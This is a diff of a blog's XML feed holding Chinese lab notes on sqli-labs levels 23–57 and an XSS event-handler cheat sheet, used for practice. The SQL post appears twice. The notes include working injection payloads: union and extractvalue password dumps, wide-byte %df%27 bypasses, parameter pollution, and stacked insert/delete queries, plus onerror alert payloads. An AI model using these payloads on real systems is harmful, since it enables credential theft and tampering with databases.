+<p>有两个问题，没有注释掉后面的limit，就会导致前面的句子都会处于where语句中，不能直接用group&#x2F;order by 探列数，所以只能union select 1,2,3 慢慢探<br>还有就是最后的payload<br>?id&#x3D;-1’ union select 1,group_concat(username,’:’,password) from users ,3 or ‘1’&#x3D;’1</p>
+<p>from 后面不能随便接东西，所以要写成：<br>?id&#x3D;-1’ union select 1,(select group_concat(username,’:’,password) from users),3 or ‘1’&#x3D;’1</p>
+<h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><h2 id="26"><a href="#26" class="headerlink" title="26"></a>26</h2><p>网上在linux环境下可以用%a0，替代空格但是我在Windows+小皮的环境就只是乱码</p>
+<p>可以报错注入，但是过滤了空格，导致select from必会产生粘连，就会出错<br>Less-26&#x2F;?id&#x3D;1%27aandnd(extractvalue(1,concat(0x7e,substring((select(group_concat(username))from(users)),1,30))))aandnd%271%27&#x3D;%271</p>
+<h2 id="26a"><a href="#26a" class="headerlink" title="26a"></a>26a</h2><p>由于不能报错注入，只能查询到库名了<br>在这浪费了巨多时间，我看网上有人说可以时间盲注，但他只写到了查询数据库名，说后面只要改代码就行，但是我是在不行，select from必出错，怀疑他在冬我，气哭了</p>
+<h2 id="27"><a href="#27" class="headerlink" title="27"></a>27</h2><p>?id&#x3D;1%27and(extractvalue(1,concat(0x7e,substring((ssselectelectelect(group_concat(username))from(users)),1,30))))and%271%27&#x3D;%271</p>
+<p>?id&#x3D;0%27%0aununionion%0assselectelectelect%0a1,(ssselectelectelect%0agroup_concat(username,%27:%27,password)%0afrom%0ausers),2%0aor%0a%271%27&#x3D;%271</p>
+<p>$id&#x3D; preg_replace(‘&#x2F;[ +]&#x2F;‘,””, $id);，只过滤普通空格和’+‘<br>$id&#x3D; preg_replace(‘&#x2F;[\s]&#x2F;‘,””, $id);，过滤了所有形式的空格，全部空白字符集合<br>这也是27可以用union查询的原因</p>
+<h2 id="27a"><a href="#27a" class="headerlink" title="27a"></a>27a</h2><p>变成双引号和去掉了报错</p>
+<h2 id="28"><a href="#28" class="headerlink" title="28"></a>28</h2><p>?id&#x3D;0%27)%0aunion%0aunion%0aselect%0aselect%0a1,(select%0agroup_concat(password)%0afrom%0ausers),2%0aor%0a%271%27&#x3D;(%271</p>
+<h2 id="29"><a href="#29" class="headerlink" title="29"></a>29</h2><p>白名单id1全数字</p>
+<p><code>$qs = $_SERVER[&#39;QUERY_STRING&#39;];</code><br><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>用于获取 URL 问号后的原始查询串，不经过 PHP 参数解析；靶场通过它手动解析取出第一个 id，模拟 JSP 参数解析逻辑，制造 HPP（HTTP 参数污染）的校验与执行参数不一致的漏洞。</p>
+<p><code>explode(&quot;&amp;&quot;,$q_s)</code>：<strong>把字符串，按照 <code>&amp;</code> 这个字符切割，切成数组</strong></p>
+<p>?id&#x3D;2&amp;id&#x3D;0’%20union%20select%201,2,group_concat(password)%20from%20users%20–+</p>
+<h2 id="30"><a href="#30" class="headerlink" title="30"></a>30</h2><p>同29，单引号变双引号</p>
+<h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><p>给输入内容自动加双引号</p>
+<p>?id&#x3D;2&amp;id&#x3D;0”)%20union%20select%201,group_concat(password),3%20from%20users%20–+</p>
+<h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          </span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                  </span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                   </span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要输入<code>&#39;</code>，PHP 就会**自动加反斜杠转义变成 <code>\&#39;</code>**，直接写<code>1&#39;</code>会变成<code>1\&#39;</code>，单引号失效，没法闭合。</p>
+<blockquote>
+<p>数据库连接编码是 GBK，<strong>GBK 是双字节编码，两个字节算 1 个汉字</strong>。</p>
+</blockquote>
+<h2 id="绕过原理（重点）"><a href="#绕过原理（重点）" class="headerlink" title="绕过原理（重点）"></a>绕过原理（重点）</h2><p>你传：<code>%df%27</code>（URL 编码：<code>%df</code> + 单引号<code>%27</code>）</p>
+<ol>
+<li>PHP 收到，看到<code>&#39;</code>，给它加反斜杠：<code>%df%5c%27</code></li>
+<li>MySQL 以 GBK 解析：<code>%df%5c</code> 拼成<strong>一个合法 GBK 汉字</strong>，吃掉这个<code>\</code></li>
+<li>剩下单独的<code>%27</code>也就是**单引号’**，成功逃逸，用来闭合 SQL。</li>
+</ol>
+<blockquote>
+<p>一句话：<code>%df</code>或<code>%aa</code>吃掉 PHP 自动添加的反斜杠，释放出单引号。</p>
+</blockquote>
+<p>payload:<br>?id&#x3D;0%df%27%20union%20select%201,2,group_concat(password)%20from%20users%20–+</p>
+<h2 id="33"><a href="#33" class="headerlink" title="33"></a>33</h2><p>Less32 使用手写自定义函数，通过多轮正则替换转义<code>\</code>、<code>&#39;</code>、<code>&quot;</code>，不处理空字节<code>\0</code>；Less33 直接使用 PHP 原生<code>addslashes()</code>，可同时转义<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\0</code>。二者均为 PHP 层面的字符转义，在 MySQL 使用 GBK 字符集的场景下，都可以被宽字节注入<code>%df%27</code>绕过。</p>
+<h2 id="34"><a href="#34" class="headerlink" title="34"></a>34</h2><p>改为post，不能在输入框里输payload，浏览器会二次编码，可以在burp，然后就是注意列数</p>
+<p>uname&#x3D;admin %df%27 union select 1,group_concat(password) from users #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><p> ?id&#x3D;0 union%20select%201,group_concat(password),3%20from%20users%20–+</p>
+<h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><p>?id&#x3D;0%aa%27union%20select%201,group_concat(password),3%20from%20users%20–+</p>
+<h2 id="37"><a href="#37" class="headerlink" title="37"></a>37</h2><p>post<br>uname&#x3D;0%aa%27union%20select%201,group_concat(password)%20from%20users%20–+&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
+<h1 id="Stacked-injections"><a href="#Stacked-injections" class="headerlink" title="Stacked injections"></a>Stacked injections</h1><h2 id="38"><a href="#38" class="headerlink" title="38"></a>38</h2><p>堆叠注入：<br>审计源码时，判断是否存在堆叠注入，优先查找数据库执行函数：</p>
+<ol>
+<li>若使用<code>mysqli_multi_query()</code>，代表支持一次执行多条 SQL，存在堆叠注入的底层条件；</li>
+<li>检查用户输入是否直接字符串拼接进 SQL，若无过滤 &#x2F; 预编译，则漏洞可利用；</li>
+<li>配套出现<code>mysqli_more_results()</code>、<code>mysqli_next_result()</code>，是处理多条 SQL 结果集的配套函数，进一步佐证多语句执行能力。</li>
+</ol>
+<p>可以在第二条语句执行增删改，也可以查但是没有回显</p>
+<h1 id="核心两点："><a href="#核心两点：" class="headerlink" title="核心两点："></a>核心两点：</h1><ol>
+<li>前面关卡：数据库连接写在外部文件 <code>sql-connections/sql-connect.php</code>，用<code>include</code>引入，连接变量写在别的文件，本页面看不到。</li>
+</ol>
+<p>php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>连接代码在外部文件，所以当前页面源码看不到<code>mysql_connect</code>。</p>
+<ol start="2">
+<li><strong>Less38 把数据库连接代码直接写在当前 php 文件内部，不再引入外部连接文件</strong>，并且选用<code>mysqli</code>扩展 + <code>mysqli_multi_query</code>做多语句堆叠查询。</li>
+</ol>
+<h2 id="靶场作者这么设计的原因（CTF-报告直接写）"><a href="#靶场作者这么设计的原因（CTF-报告直接写）" class="headerlink" title="靶场作者这么设计的原因（CTF 报告直接写）"></a>靶场作者这么设计的原因（CTF 报告直接写）</h2><ol>
+<li><p><strong>为了演示<code>mysqli_multi_query</code>的完整使用流程</strong></p>
+<p> <code>mysqli_multi_query</code>、<code>mysqli_more_results</code>、<code>mysqli_next_result</code> 全都**依赖 mysqli 的连接句柄<code>$con1</code>**。</p>
+<p> 作者直接把 mysqli 连接写在当前页面，方便你一次性看完整套完整代码：</p>
+<p> 建立连接 → 拼接可控 id → multi_query 执行多条 SQL → 判断多结果集。</p>
+<p> 如果继续用外部 include，你还要去翻另一个文件看 mysqli 连接，不方便学习。</p>
+</li>
+<li><p><strong>区分两套数据库 API：老 mysql 扩展 vs mysqli 扩展</strong></p>
+<p> 前面宽字节关卡用的是废弃的<code>mysql_*</code>函数，写在外部公共连接文件。</p>
+<p> 38 是新知识点「堆叠注入」，专门切换到<code>mysqli</code>这套 API，<strong>直接在本页面写连接代码，清晰展示 mysqli 整套调用</strong>，用来教学。</p>
+</li>
+<li><p>设计考察点：</p>
+<p> 考察审计的时候，能认出<code>mysqli_multi_query</code>，理解它依赖 mysqli 连接，支持分号多条 SQL。</p>
+</li>
+</ol>
+<h2 id="39"><a href="#39" class="headerlink" title="39"></a>39</h2><p>与38相同，只是没有闭合</p>
+<h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><p>40为’)闭合<br>?id&#x3D;1&amp;id&#x3D;0‘) union select 1,2,group_concat(username) from users –+</p>
+<h2 id="41"><a href="#41" class="headerlink" title="41"></a>41</h2><p>?id&#x3D;1&amp;id&#x3D;0 union select 1,2,group_concat(username) from users –+</p>
+<h2 id="42"><a href="#42" class="headerlink" title="42"></a>42</h2><p>注入点在password<br>‘ ;insert into users(username,password) values(‘zsy’,’520’);#<br>‘ ;delete from users where username&#x3D;’zsy’;#</p>
+<h2 id="43"><a href="#43" class="headerlink" title="43"></a>43</h2><p>同42，变为’)闭合</p>
+<h2 id="44"><a href="#44" class="headerlink" title="44"></a>44</h2><p>没报错了，单引号闭合</p>
+<h2 id="45"><a href="#45" class="headerlink" title="45"></a>45</h2><p>‘)闭合</p>
+<h2 id="46"><a href="#46" class="headerlink" title="46"></a>46</h2><p>?sort&#x3D;1%20and%20extractvalue(1,concat(0x7e,substring((select%20group_concat(username,%27:%27,password)%20from%20users),1,30))) –+</p>
+<h2 id="47"><a href="#47" class="headerlink" title="47"></a>47</h2><p>?sort&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,substring((select%20group_concat(username,%27:%27,password)%20from%20users),1,30)))%20–+</p>
+<h2 id="48"><a href="#48" class="headerlink" title="48"></a>48</h2><p>用盲注的方法，懒得写了</p>
+<h2 id="49"><a href="#49" class="headerlink" title="49"></a>49</h2><p>同样的变成了字符型而已</p>
+<h2 id="50"><a href="#50" class="headerlink" title="50"></a>50</h2><p>?sort&#x3D;1;insert into users(id,username,password) values(15,’zsy’,’520’);–+</p>
+<h2 id="51"><a href="#51" class="headerlink" title="51"></a>51</h2><p>同50，加单引号闭合</p>
+<h2 id="52"><a href="#52" class="headerlink" title="52"></a>52</h2><p>同50，无报错</p>
+<h2 id="53"><a href="#53" class="headerlink" title="53"></a>53</h2><p>同52，加单引号闭合</p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><h2 id="54"><a href="#54" class="headerlink" title="54"></a>54</h2><p>头一次打挑战关卡，感觉有意思多了<br>数字型 union，没什么难度</p>
+<h2 id="55"><a href="#55" class="headerlink" title="55"></a>55</h2><p>加了()闭合，</p>
+<h2 id="56"><a href="#56" class="headerlink" title="56"></a>56</h2><p>单引号闭合</p>
+<h2 id="57"><a href="#57" class="headerlink" title="57"></a>57</h2>]]></content>
+      <categories>
+        <category>技术</category>
+        <category>基础漏洞</category>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>sql靶场</tag>
+      </tags>
   </entry>
   <entry>
     <title>Java环境下XSS</title>
@@ -814,109 +1562,75 @@
       </categories>
   </entry>
   <entry>
-    <title>sql 打靶日记23~75</title>
-    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/sql%20%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B023~75/</url>
-    <content><![CDATA[<h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p>过滤了 –，#，先过滤#再过滤–，所以不能-#-来</p>
-<p>看报错’’1’’ LIMIT 0,1’，不看源码也可以知道大概sql语句是:<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
-<p>主要就是想办法过处理后面那个单引号，就可以用or ‘1’&#x3D;’1</p>
-<p>有两个问题，没有注释掉后面的limit，就会导致前面的句子都会处于where语句中，不能直接用group&#x2F;order by 探列数，所以只能union select 1,2,3 慢慢探<br>还有就是最后的payload<br>?id&#x3D;-1’ union select 1,group_concat(username,’:’,password) from users ,3 or ‘1’&#x3D;’1</p>
-<p>from 后面不能随便接东西，所以要写成：<br>?id&#x3D;-1’ union select 1,(select group_concat(username,’:’,password) from users),3 or ‘1’&#x3D;’1</p>
-<h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><h2 id="26"><a href="#26" class="headerlink" title="26"></a>26</h2><p>网上在linux环境下可以用%a0，替代空格但是我在Windows+小皮的环境就只是乱码</p>
-<p>可以报错注入，但是过滤了空格，导致select from必会产生粘连，就会出错<br>Less-26&#x2F;?id&#x3D;1%27aandnd(extractvalue(1,concat(0x7e,substring((select(group_concat(username))from(users)),1,30))))aandnd%271%27&#x3D;%271</p>
-<h2 id="26a"><a href="#26a" class="headerlink" title="26a"></a>26a</h2><p>由于不能报错注入，只能查询到库名了<br>在这浪费了巨多时间，我看网上有人说可以时间盲注，但他只写到了查询数据库名，说后面只要改代码就行，但是我是在不行，select from必出错，怀疑他在冬我，气哭了</p>
-<h2 id="27"><a href="#27" class="headerlink" title="27"></a>27</h2><p>?id&#x3D;1%27and(extractvalue(1,concat(0x7e,substring((ssselectelectelect(group_concat(username))from(users)),1,30))))and%271%27&#x3D;%271</p>
-<p>?id&#x3D;0%27%0aununionion%0assselectelectelect%0a1,(ssselectelectelect%0agroup_concat(username,%27:%27,password)%0afrom%0ausers),2%0aor%0a%271%27&#x3D;%271</p>
-<p>$id&#x3D; preg_replace(‘&#x2F;[ +]&#x2F;‘,””, $id);，只过滤普通空格和’+‘<br>$id&#x3D; preg_replace(‘&#x2F;[\s]&#x2F;‘,””, $id);，过滤了所有形式的空格，全部空白字符集合<br>这也是27可以用union查询的原因</p>
-<h2 id="27a"><a href="#27a" class="headerlink" title="27a"></a>27a</h2><p>变成双引号和去掉了报错</p>
-<h2 id="28"><a href="#28" class="headerlink" title="28"></a>28</h2><p>?id&#x3D;0%27)%0aunion%0aunion%0aselect%0aselect%0a1,(select%0agroup_concat(password)%0afrom%0ausers),2%0aor%0a%271%27&#x3D;(%271</p>
-<h2 id="29"><a href="#29" class="headerlink" title="29"></a>29</h2><p>白名单id1全数字</p>
-<p><code>$qs = $_SERVER[&#39;QUERY_STRING&#39;];</code><br><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>用于获取 URL 问号后的原始查询串，不经过 PHP 参数解析；靶场通过它手动解析取出第一个 id，模拟 JSP 参数解析逻辑，制造 HPP（HTTP 参数污染）的校验与执行参数不一致的漏洞。</p>
-<p><code>explode(&quot;&amp;&quot;,$q_s)</code>：<strong>把字符串，按照 <code>&amp;</code> 这个字符切割，切成数组</strong></p>
-<p>?id&#x3D;2&amp;id&#x3D;0’%20union%20select%201,2,group_concat(password)%20from%20users%20–+</p>
-<h2 id="30"><a href="#30" class="headerlink" title="30"></a>30</h2><p>同29，单引号变双引号</p>
-<h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><p>给输入内容自动加双引号</p>
-<p>?id&#x3D;2&amp;id&#x3D;0”)%20union%20select%201,group_concat(password),3%20from%20users%20–+</p>
-<h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          </span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                  </span><br><span class="line"></span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                   </span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>只要输入<code>&#39;</code>，PHP 就会**自动加反斜杠转义变成 <code>\&#39;</code>**，直接写<code>1&#39;</code>会变成<code>1\&#39;</code>，单引号失效，没法闭合。</p>
-<blockquote>
-<p>数据库连接编码是 GBK，<strong>GBK 是双字节编码，两个字节算 1 个汉字</strong>。</p>
+    <title>XSS 高频事件</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%20%E9%AB%98%E9%A2%91%E4%BA%8B%E4%BB%B6/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="XSS-高频事件（"><a href="#XSS-高频事件（" class="headerlink" title="XSS 高频事件（"></a>XSS 高频事件（</h1><blockquote>
+<p>场景：<code>&lt; &gt;</code>被过滤，不能注入<code>&lt;script&gt;</code>标签，<strong>只能给已有 HTML 标签追加事件属性</strong>，事件触发就执行 JS。</p>
 </blockquote>
-<h2 id="绕过原理（重点）"><a href="#绕过原理（重点）" class="headerlink" title="绕过原理（重点）"></a>绕过原理（重点）</h2><p>你传：<code>%df%27</code>（URL 编码：<code>%df</code> + 单引号<code>%27</code>）</p>
-<ol>
-<li>PHP 收到，看到<code>&#39;</code>，给它加反斜杠：<code>%df%5c%27</code></li>
-<li>MySQL 以 GBK 解析：<code>%df%5c</code> 拼成<strong>一个合法 GBK 汉字</strong>，吃掉这个<code>\</code></li>
-<li>剩下单独的<code>%27</code>也就是**单引号’**，成功逃逸，用来闭合 SQL。</li>
+<h2 id="鼠标事件（最常用，level3-就是这类）"><a href="#鼠标事件（最常用，level3-就是这类）" class="headerlink" title="鼠标事件（最常用，level3 就是这类）"></a>鼠标事件（最常用，level3 就是这类）</h2><ul>
+<li><code>onclick</code>：鼠标<strong>单击</strong>元素触发（level3 用的）</li>
+<li><code>ondblclick</code>：鼠标<strong>双击</strong>触发</li>
+<li><code>onmouseover</code>：鼠标<strong>悬浮放上去</strong>就触发（推荐，不用点击）</li>
+<li><code>onmouseout</code>：鼠标<strong>移开</strong>元素触发</li>
+<li><code>onmousemove</code>：鼠标在元素上移动持续触发</li>
+<li><code>oncontextmenu</code>：<strong>右键菜单</strong>（右键点击）触发</li>
+</ul>
+<h2 id="焦点-键盘事件（input-输入框神器，XSSlab-高频）"><a href="#焦点-键盘事件（input-输入框神器，XSSlab-高频）" class="headerlink" title="焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）"></a>焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）</h2><ul>
+<li><code>onfocus</code>：元素<strong>获得焦点</strong>（点进输入框）触发</li>
+<li><code>onblur</code>：元素<strong>失去焦点</strong>（点别处）触发</li>
+<li><code>onkeydown</code>：按下按键瞬间触发</li>
+<li><code>onkeyup</code>：松开按键触发</li>
+<li><code>onkeypress</code>：按键按下并产生字符时触发</li>
+</ul>
+<h2 id="加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）"><a href="#加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）" class="headerlink" title="加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）"></a>加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）</h2><blockquote>
+<p>这类最好用，不用用户点、不用悬浮，页面渲染直接弹</p>
+</blockquote>
+<ul>
+<li><code>onload</code>：<strong>元素加载成功</strong>触发（img、svg、iframe、body）</li>
+<li><code>onerror</code>：<strong>元素加载失败</strong>触发，最经典！</li>
+</ul>
+<blockquote>
+<p>示例：<code>&lt;img src=x onerror=alert(1)&gt;</code> src&#x3D;x 图片不存在，直接执行 JS</p>
+</blockquote>
+<ul>
+<li><code>onpageshow</code>：页面展示时触发（body）</li>
+</ul>
+<h2 id="表单、内容事件"><a href="#表单、内容事件" class="headerlink" title="表单、内容事件"></a>表单、内容事件</h2><ul>
+<li><code>onchange</code>：输入框内容改变、下拉框切换触发</li>
+<li><code>onselect</code>：选中输入框里面文字时触发</li>
+<li><code>oncopy</code>：复制内容触发</li>
+<li><code>oncut</code>：剪切内容触发</li>
+<li><code>onpaste</code>：粘贴内容触发</li>
+</ul>
+<h2 id="HTML5-新事件（过滤严格靶场备选）"><a href="#HTML5-新事件（过滤严格靶场备选）" class="headerlink" title="HTML5 新事件（过滤严格靶场备选）"></a>HTML5 新事件（过滤严格靶场备选）</h2><ul>
+<li><code>ontoggle</code>：<code>&lt;details&gt;</code>折叠面板展开 &#x2F; 收起触发</li>
+<li><code>onstart</code>：<code>&lt;marquee&gt;</code>滚动标签启动触发</li>
+</ul>
+<hr>
+<h1 id="两个重要分类（实战区分）"><a href="#两个重要分类（实战区分）" class="headerlink" title="两个重要分类（实战区分）"></a>两个重要分类（实战区分）</h1><ol>
+<li><strong>需要用户交互</strong>：<code>onclick / onmouseover / onfocus</code>（level3 用的，必须用户做动作）</li>
+<li><strong>无交互自动执行</strong>：<code>onerror、onload</code>（优先选！不需要用户点击，访问页面直接触发）</li>
 </ol>
 <blockquote>
-<p>一句话：<code>%df</code>或<code>%aa</code>吃掉 PHP 自动添加的反斜杠，释放出单引号。</p>
+<p>举 onerror 例子：</p>
+<p>payload：<code>&#39;&gt;&lt;img src=x onerror=alert(1)//</code></p>
+<p>原理：图片地址<code>x</code>不存在，触发 onerror，自动执行 alert，不用任何点击。</p>
 </blockquote>
-<p>payload:<br>?id&#x3D;0%df%27%20union%20select%201,2,group_concat(password)%20from%20users%20–+</p>
-<h2 id="33"><a href="#33" class="headerlink" title="33"></a>33</h2><p>Less32 使用手写自定义函数，通过多轮正则替换转义<code>\</code>、<code>&#39;</code>、<code>&quot;</code>，不处理空字节<code>\0</code>；Less33 直接使用 PHP 原生<code>addslashes()</code>，可同时转义<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\0</code>。二者均为 PHP 层面的字符转义，在 MySQL 使用 GBK 字符集的场景下，都可以被宽字节注入<code>%df%27</code>绕过。</p>
-<h2 id="34"><a href="#34" class="headerlink" title="34"></a>34</h2><p>改为post，不能在输入框里输payload，浏览器会二次编码，可以在burp，然后就是注意列数</p>
-<p>uname&#x3D;admin %df%27 union select 1,group_concat(password) from users #  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
-<h2 id="35"><a href="#35" class="headerlink" title="35"></a>35</h2><p> ?id&#x3D;0 union%20select%201,group_concat(password),3%20from%20users%20–+</p>
-<h2 id="36"><a href="#36" class="headerlink" title="36"></a>36</h2><p>?id&#x3D;0%aa%27union%20select%201,group_concat(password),3%20from%20users%20–+</p>
-<h2 id="37"><a href="#37" class="headerlink" title="37"></a>37</h2><p>post<br>uname&#x3D;0%aa%27union%20select%201,group_concat(password)%20from%20users%20–+&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p>
-<h1 id="Stacked-injections"><a href="#Stacked-injections" class="headerlink" title="Stacked injections"></a>Stacked injections</h1><h2 id="38"><a href="#38" class="headerlink" title="38"></a>38</h2><p>堆叠注入：<br>审计源码时，判断是否存在堆叠注入，优先查找数据库执行函数：</p>
-<ol>
-<li>若使用<code>mysqli_multi_query()</code>，代表支持一次执行多条 SQL，存在堆叠注入的底层条件；</li>
-<li>检查用户输入是否直接字符串拼接进 SQL，若无过滤 &#x2F; 预编译，则漏洞可利用；</li>
-<li>配套出现<code>mysqli_more_results()</code>、<code>mysqli_next_result()</code>，是处理多条 SQL 结果集的配套函数，进一步佐证多语句执行能力。</li>
+<h2 id="靶场使用小规则（审计-payload-思路）"><a href="#靶场使用小规则（审计-payload-思路）" class="headerlink" title="靶场使用小规则（审计 payload 思路）"></a>靶场使用小规则（审计 payload 思路）</h2><ol>
+<li>上下文是 input 输入框：优先 <code>onfocus onmouseover onclick</code></li>
+<li>可以注入 img&#x2F;svg 标签：优先 <code>onerror / onload</code>，<strong>免交互</strong></li>
+<li>单引号闭合属性：payload 用 <code>&#39; 事件名=alert(1)//</code></li>
+<li>双引号闭合属性：payload 用 <code>&quot; 事件名=alert(1)//</code></li>
 </ol>
-<p>可以在第二条语句执行增删改，也可以查但是没有回显</p>
-<h1 id="核心两点："><a href="#核心两点：" class="headerlink" title="核心两点："></a>核心两点：</h1><ol>
-<li>前面关卡：数据库连接写在外部文件 <code>sql-connections/sql-connect.php</code>，用<code>include</code>引入，连接变量写在别的文件，本页面看不到。</li>
-</ol>
-<p>php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>连接代码在外部文件，所以当前页面源码看不到<code>mysql_connect</code>。</p>
-<ol start="2">
-<li><strong>Less38 把数据库连接代码直接写在当前 php 文件内部，不再引入外部连接文件</strong>，并且选用<code>mysqli</code>扩展 + <code>mysqli_multi_query</code>做多语句堆叠查询。</li>
-</ol>
-<h2 id="靶场作者这么设计的原因（CTF-报告直接写）"><a href="#靶场作者这么设计的原因（CTF-报告直接写）" class="headerlink" title="靶场作者这么设计的原因（CTF 报告直接写）"></a>靶场作者这么设计的原因（CTF 报告直接写）</h2><ol>
-<li><p><strong>为了演示<code>mysqli_multi_query</code>的完整使用流程</strong></p>
-<p> <code>mysqli_multi_query</code>、<code>mysqli_more_results</code>、<code>mysqli_next_result</code> 全都**依赖 mysqli 的连接句柄<code>$con1</code>**。</p>
-<p> 作者直接把 mysqli 连接写在当前页面，方便你一次性看完整套完整代码：</p>
-<p> 建立连接 → 拼接可控 id → multi_query 执行多条 SQL → 判断多结果集。</p>
-<p> 如果继续用外部 include，你还要去翻另一个文件看 mysqli 连接，不方便学习。</p>
-</li>
-<li><p><strong>区分两套数据库 API：老 mysql 扩展 vs mysqli 扩展</strong></p>
-<p> 前面宽字节关卡用的是废弃的<code>mysql_*</code>函数，写在外部公共连接文件。</p>
-<p> 38 是新知识点「堆叠注入」，专门切换到<code>mysqli</code>这套 API，<strong>直接在本页面写连接代码，清晰展示 mysqli 整套调用</strong>，用来教学。</p>
-</li>
-<li><p>设计考察点：</p>
-<p> 考察审计的时候，能认出<code>mysqli_multi_query</code>，理解它依赖 mysqli 连接，支持分号多条 SQL。</p>
-</li>
-</ol>
-<h2 id="39"><a href="#39" class="headerlink" title="39"></a>39</h2><p>与38相同，只是没有闭合</p>
-<h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><p>40为’)闭合<br>?id&#x3D;1&amp;id&#x3D;0‘) union select 1,2,group_concat(username) from users –+</p>
-<h2 id="41"><a href="#41" class="headerlink" title="41"></a>41</h2><p>?id&#x3D;1&amp;id&#x3D;0 union select 1,2,group_concat(username) from users –+</p>
-<h2 id="42"><a href="#42" class="headerlink" title="42"></a>42</h2><p>注入点在password<br>‘ ;insert into users(username,password) values(‘zsy’,’520’);#<br>‘ ;delete from users where username&#x3D;’zsy’;#</p>
-<h2 id="43"><a href="#43" class="headerlink" title="43"></a>43</h2><p>同42，变为’)闭合</p>
-<h2 id="44"><a href="#44" class="headerlink" title="44"></a>44</h2><p>没报错了，单引号闭合</p>
-<h2 id="45"><a href="#45" class="headerlink" title="45"></a>45</h2><p>‘)闭合</p>
-<h2 id="46"><a href="#46" class="headerlink" title="46"></a>46</h2><p>?sort&#x3D;1%20and%20extractvalue(1,concat(0x7e,substring((select%20group_concat(username,%27:%27,password)%20from%20users),1,30))) –+</p>
-<h2 id="47"><a href="#47" class="headerlink" title="47"></a>47</h2><p>?sort&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,substring((select%20group_concat(username,%27:%27,password)%20from%20users),1,30)))%20–+</p>
-<h2 id="48"><a href="#48" class="headerlink" title="48"></a>48</h2><p>用盲注的方法，懒得写了</p>
-<h2 id="49"><a href="#49" class="headerlink" title="49"></a>49</h2><p>同样的变成了字符型而已</p>
-<h2 id="50"><a href="#50" class="headerlink" title="50"></a>50</h2><p>?sort&#x3D;1;insert into users(id,username,password) values(15,’zsy’,’520’);–+</p>
-<h2 id="51"><a href="#51" class="headerlink" title="51"></a>51</h2><p>同50，加单引号闭合</p>
-<h2 id="52"><a href="#52" class="headerlink" title="52"></a>52</h2><p>同50，无报错</p>
-<h2 id="53"><a href="#53" class="headerlink" title="53"></a>53</h2><p>同52，加单引号闭合</p>
-<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><h2 id="54"><a href="#54" class="headerlink" title="54"></a>54</h2><p>头一次打挑战关卡，感觉有意思多了<br>数字型 union，没什么难度</p>
-<h2 id="55"><a href="#55" class="headerlink" title="55"></a>55</h2><p>加了()闭合，</p>
-<h2 id="56"><a href="#56" class="headerlink" title="56"></a>56</h2><p>单引号闭合</p>
-<h2 id="57"><a href="#57" class="headerlink" title="57"></a>57</h2>]]></content>
